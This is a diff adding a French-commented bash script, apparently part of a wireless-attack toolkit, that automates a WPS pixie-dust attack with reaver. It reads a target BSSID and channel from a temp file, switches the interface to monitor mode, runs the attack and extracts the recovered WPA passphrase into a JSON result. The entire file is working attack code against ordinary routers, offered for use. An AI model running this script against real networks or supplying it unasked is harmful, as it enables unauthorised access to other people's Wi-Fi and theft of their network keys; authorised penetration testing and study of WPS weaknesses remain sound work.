@@ -1,0 +1,40 @@
+#!/usr/bin/env bash
+# Attaque WPS pixie-dust (reaver) sur une cible, pour le module Sly.
+# Parametres dans /tmp/fennec-wps-target : l1 interface, l2 BSSID, l3 canal.
+# Resultat ecrit dans /tmp/fennec-wps-result.json, sortie live dans /tmp/fennec-wps.log
+set -uo pipefail
+CFG=/tmp/fennec-wps-target
+LOG=/tmp/fennec-wps.log
+RES=/tmp/fennec-wps-result.json
+
+IFACE="$(sed -n '1p' "$CFG")"
+BSSID="$(sed -n '2p' "$CFG")"
+CANAL="$(sed -n '3p' "$CFG")"
+
+: > "$LOG"
+printf '{"status":"running","bssid":"%s"}' "$BSSID" > "$RES"
+
+[ -n "$IFACE" ] && [ -n "$BSSID" ] || { printf '{"status":"failed","bssid":"%s"}' "$BSSID" > "$RES"; exit 1; }
+
+# Interface en mode monitor.
+ip link set "$IFACE" down 2>/dev/null || true
+iw dev "$IFACE" set type monitor 2>/dev/null || true
+ip link set "$IFACE" up 2>/dev/null || true
+
+CH_OPT=""
+[ -n "$CANAL" ] && [ "$CANAL" != "0" ] && CH_OPT="-c $CANAL"
+
+# Pixie-dust, borne dans le temps pour ne pas tourner indefiniment.
+stdbuf -oL -eL timeout 180 reaver -i "$IFACE" -b "$BSSID" $CH_OPT -K 1 -N -S -vv >> "$LOG" 2>&1 || true
+
+# Cle recuperee ?
+PSK="$(grep -oP "WPA PSK:\s*'\K[^']*" "$LOG" | head -n1 || true)"
+if [ -n "$PSK" ]; then
+  BSSID="$BSSID" PSK="$PSK" RES="$RES" python3 - <<'PY'
+import json, os
+json.dump({"status": "found", "bssid": os.environ["BSSID"], "psk": os.environ["PSK"]},
+          open(os.environ["RES"], "w"))
+PY
+else
+  printf '{"status":"failed","bssid":"%s"}' "$BSSID" > "$RES"
+fi
